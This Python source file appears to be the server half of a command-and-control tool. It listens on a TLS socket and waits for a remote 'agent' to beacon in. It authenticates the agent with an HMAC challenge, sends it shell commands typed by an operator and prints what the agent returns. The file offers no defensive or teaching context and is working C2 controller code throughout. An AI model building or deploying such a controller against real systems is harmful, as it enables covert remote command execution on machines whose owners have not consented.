import json
import socket
import hmac
import hashlib
import os
import sys
import ssl

CONFIG_FILE = "./config.json"

def load_config():
    with open(CONFIG_FILE, "r") as f:
        config = json.load(f)
    return config["host"], config["port"], config["secret"]

HOST, PORT, SECRET = load_config()

def compute_hmac(secret, message):
    return hmac.new(secret.encode(), message, hashlib.sha256).digest()


def generate_challenge():
    return os.urandom(16)


def authenticate(conn, secret):
    # print("[*] Authenticating client...")
    try:
        challenge = generate_challenge()
        conn.sendall(challenge)
        # print("Challenge sent:", challenge)

        response = conn.recv(1024)
        # print("Received HMAC:", response)
        if not response:
            return False
        
        expected = compute_hmac(secret, challenge)
        
        # print("Challenge sent:", challenge)
        # print("Expected HMAC:", expected)
        # print("Received HMAC:", response)

        if hmac.compare_digest(response, expected):
            conn.sendall(b"OK")
            return True
        else:
            conn.sendall(b"FAIL")
            return False
    except:
        print("in exception")
        return False


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    
    # Wrap the socket with SSL
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile="server.crt", keyfile="server.key")
    secure_server = context.wrap_socket(server, server_side=True)

    print(f"[+] Listening on port {PORT}...")

    while True:
        # Get a non-empty command BEFORE waiting for the agent to beacon in
        while True:
            command = input("> ").strip()
            if command:
                break

        if command.lower() == "exit":
            print("[*] Closing connection")
            sys.exit(0)

        try:
            # Now wait for the next beacon
            conn, addr = secure_server.accept()
            # print(f"[+] Connection from {addr}")

            if not authenticate(conn, SECRET):
                conn.close()
                continue

            conn.sendall(command.encode())

            output = conn.recv(8192)

            if not output and not "cd" in command:
                print("[-] No response")
            else:
                print(output.decode())

            conn.close()
        except (ConnectionResetError, BrokenPipeError, ssl.SSLError):
            print("[-] Agent disconnected. Going back to listening...")
            continue # loops back to s.accept() instead of crashing
        except KeyboardInterrupt:
            print("\n[!] Shutting down controller.")
            break


if __name__ == "__main__":
    main()